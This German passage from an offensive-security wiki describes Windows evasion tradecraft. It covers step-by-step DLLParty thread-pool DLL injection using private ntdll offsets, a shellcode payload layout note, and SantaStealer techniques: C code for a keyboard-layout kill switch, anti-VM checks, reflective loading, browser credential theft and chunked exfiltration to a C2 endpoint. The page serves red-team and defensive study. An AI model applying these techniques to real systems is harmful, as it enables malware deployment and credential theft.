Die bereitgestellte Implementierung ist x64-spezifisch: Sie ändert `CONTEXT.Rip`, und der eingebettete Payload ist x64-Shellcode. `rawData` beginnt mit einem 25-Byte-Marker, daher starten die ausführbaren Bytes am hexadezimalen Offset `0x19`. Achten Sie beim Ersetzen des Payloads darauf, dieses Layout beizubehalten oder Marker, Suchvektor, Array-Größe und Ausführungs-Offset gemeinsam zu aktualisieren. Die Quellkommentare führen außerdem `0x0A`, `0x0D` und `0x1A` als Bad Characters auf. Dieser Workflow ändert weder das Token noch die Privilegien des Child-Prozesses.<sup>[[41]](#references)</sup>

Kleine native Hilfsprogramme und Muster zur Payload-Kompilierung finden Sie unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-Pool-Callback-DLL-Injection ohne Shellcode (DLLParty)

DLLParty adaptiert eine Thread-Pool-Injection im PoolParty-Stil, sodass ein vorhandener Worker im Zielprozess `LoadLibraryA` aufruft, statt einen injizierten Callback-Stub auszuführen. Die Dispatch-Primitiv ist eine `TP_DIRECT`-Completion, die in den I/O-Completion-Port des Ziel-Pools eingereiht wird. Damit werden die Prozessberechtigungen nicht umgangen: Der PoC ruft `OpenProcess(PROCESS_ALL_ACCESS)` auf und benötigt les- und beschreibbaren Speicher im Zielprozess sowie duplizierbare Worker-Factory- und Completion-Port-Handles.<sup>[[46]](#references)[[47]](#references)</sup>

Unter Windows x64 übergibt der Worker einen Zeiger auf seine stackbasierte `TP_CALLBACK_INSTANCE` in `RCX`, dem ersten Callback-Argument. `LoadLibraryA` interpretiert denselben Zeiger als `LPCSTR`. Im getesteten Ausführungspfad erstellt `TppWorkerThread` den Zeiger bei `RSP+0x178`, während der erste gewöhnliche Schreibzugriff auf dieses Objekt bei `RSP+0x1d0` erfolgt. Ein nullterminierter DLL-Pfad, der in dieses 0x58 Byte lange Präfix passt, kann daher am Anfang der Instanz stehen, ohne vor dem Dispatch überschrieben zu werden. Diese Beobachtung gilt für einen bestimmten Build und ist keine dokumentierte Windows-ABI-Garantie.<sup>[[46]](#references)[[47]](#references)</sup>

Der Referenz-Workflow ist:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumerieren Sie die Handles des Ziels mit `NtQuerySystemInformation(SystemHandleInformation)` und identifizieren Sie `TpWorkerFactory`, indem Sie die Objekttypen abfragen. Duplizieren Sie ein Worker-Factory-Handle und fragen Sie `WorkerFactoryBasicInformation` ab; `StartParameter` liefert den remote `TP_POOL`. Überspringen Sie Factories mit `TotalWorkerCount == 0`.
2. Lesen Sie `TP_POOL.CompletionPort` aus und durchlaufen Sie die private Worker-Liste des Pools. Im getesteten Windows-10-19045-x64-Build (`ntdll.dll 10.0.19041.4842`) befindet sich ihr Kopf bei `pool+0x60`; jeder Link liegt bei `worker+0x10`, sodass der Callback-Instance-Slot bei `worker+0x38` `link+0x28` entspricht. Der PoC prüft die Zeigerausrichtung, die Gegenseitigkeit der Links, die Pool-Zugehörigkeit, nichtnull Thread-IDs, wiederholte Knoten und einen stabilen Listen-Kopf.
3. Schreiben Sie den DLL-Pfad in **jeden** ermittelten Worker-Slot, da die eingereihte Completion von jedem Worker verarbeitet werden kann. Platzieren Sie eine `TP_DIRECT` mit `Callback = LoadLibraryA` in beschreibbaren Speicher des Zielprozesses. Der PoC verwendet `last_slot-0x500` auf einem Worker-Stack statt `VirtualAllocEx`; dieser Offset ist experimentell und darf nicht mit aktiven Stack-Daten kollidieren.
4. Duplizieren Sie das Completion-Port-Handle des Ziels und rufen Sie `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` auf. Die remote `TP_DIRECT`-Adresse dient als Completion Key. Ein vorhandener Worker ruft dann `LoadLibraryA` mit seinem überschriebenen Callback-Instance-Zeiger auf und lädt eine DLL, auf die der Zielprozess bereits zugreifen kann.

Der PoC akzeptiert eine Ziel-PID (`DLLParty.exe <target_pid>`) und verwendet einen fest codierten DLL-Pfad in `DLLParty.cpp`; legen Sie vor dem Erstellen einer x64-Executable einen Pfad fest, auf den der Zielprozess zugreifen kann. Außerdem wird die `LoadLibraryA`-Adresse des eigenen Prozesses als Callback im Zielprozess verwendet, weshalb vorausgesetzt wird, dass diese Adresse im Zielprozess gültig ist. Der Code prüft weder, ob die Pfadlänge in das 0x58-Byte-Präfix passt, noch ob die Worker-Durchsuchung einen Slot gefunden hat, bevor das letzte Element indiziert wird. Überprüfen Sie die privaten Offsets, das Stack-Layout und den beschreibbaren Speicher für den Ziel-Build erneut. Der Verzicht auf `CreateRemoteThreadEx`, Shellcode und `VirtualAllocEx` beseitigt weder Schreibzugriffe zwischen Prozessen noch Telemetrie zum Laden von DLLs.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer-Tradecraft für dateilose Umgehung und Credential-Diebstahl

SantaStealer (auch bekannt als BluelineStealer) veranschaulicht, wie moderne Info-Stealer AV-Bypass, Anti-Analyse und den Zugriff auf Zugangsdaten in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Tastaturlayout-Prüfung und Sandbox-Verzögerung

- Ein Konfigurationsflag (`anti_cis`) enumeriert installierte Tastaturlayouts über `GetKeyboardLayoutList`. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`-Marker an und beendet sich, bevor die Stealer ausgeführt werden. So wird sichergestellt, dass es in ausgeschlossenen Regionen nie detoniert, während ein Artefakt für die Suche zurückbleibt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Geschichtete `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht sie mit eingebetteten Blocklisten für Debugger/Sandboxes. Anschließend berechnet sie die Prüfsumme erneut für den Computernamen und überprüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl an Prozessen, kürzliche Systemlaufzeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Zeitmessungen rund um Wartezeiten durch, um Einzelschritte zu erkennen. Jeder Treffer führt zum Abbruch, bevor Module gestartet werden.

### Fileless-Helper + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE enthält einen Chromium-Credential-Helper, der entweder auf der Festplatte abgelegt oder manuell in den Speicher gemappt wird. Im fileless-Modus löst er Importe/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Der Helper speichert eine zweite DLL-Stufe, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Entschlüsselungsschritten lädt er den Blob reflectively (ohne `LoadLibrary`) und ruft die Exporte `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) stammen.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden Reflective Process Hollowing mit direkten Systemaufrufen, um Code in einen laufenden Chromium-Browser einzuschleusen, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkartendaten trotz ABE-Härtung direkt aus SQLite-Datenbanken zu entschlüsseln.

### Modulare In-Memory-Sammlung & HTTP-Exfiltration in Chunks

- `create_memory_based_log` durchläuft eine globale Funktionzeigertabelle namens `memory_generators` und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Puffer und meldet nach einer Join-Wartezeit von etwa 45 Sekunden die Anzahl seiner Dateien.
- Nach Abschluss wird alles mit der statisch gelinkten Bibliothek `miniz` als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet anschließend 15 Sekunden und streamt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`. Dabei wird eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht. Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>`. Der letzte Chunk fügt `complete: true` hinzu, damit der C2 weiß, dass der Zusammenbau abgeschlossen ist.

## References

- [1] [Fortgeschrittene Evasion-Techniken: präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call-Stacks: keine Freifahrtscheine mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC zum Spoofing von Call-Stacks](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Verschleierung bei DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollten Sie Ihrem Zero Trust vertrauen? Umgehung der Zscaler-Posture-Prüfungen](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Einblicke in frühere Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exporte](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exporte in Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) bekämpfen](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschicht von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum Befehl mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Hinter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung der Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mithilfe von API-Tracing abwehren](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Dornröschen: Adaptix mit Crystal Palace zur Ruhe legen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Vergiftung von Prozessparametern](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Dornröschen II: CFG, CET und Stack-Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dotnet-Etw verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Missbrauch von Chrome Remote Desktop bei Red-Team-Operationen: Ein praktischer Leitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Defenders Remediation Driver als Kernel-Operationsprimitive weaponisieren](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Begleitcode zu MDSecs Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Selbstmaskierende Funktionen mit LLVM erstellen](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-Quellcode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-Funktion](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Erstellen eines untergeordneten Prozesses mit umgeleiteter Ein- und Ausgabe](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: C#-Tools mit WasmForge neu schmieden](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – C#-/.NET-Projekte kompilieren](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty-Proof-of-Concept und Quellcode](https://github.com/epersic/DLLParty)
- [47] [DLLParty – Interna des Thread-Pools für shellcodeless DLL-Injection missbrauchen](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024-Benchmark-Datensatz und thrember-Tools](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024 zur Bewertung von Red-Team-Implants verwenden](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine-Learning-basierte Erkennungen umgehen](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – .NET-Ladeframework NetamLoader auf XAML-Basis](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT-Aufzählung](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan-Methode](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz – Technische Analyse von 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
- [55] [Übersicht zu tprtdll-Injection und Exportinventar](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/README.md)
- [56] [Trusted-twin-Self-Injection-PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_self.cpp)
- [57] [Trusted-twin-Cross-Process-Injection-PoC](https://github.com/ivancabrera02/tprtdll-Injection/blob/main/trustedtwin_cross.cpp)
{{#include ../banners/hacktricks-training.md}}
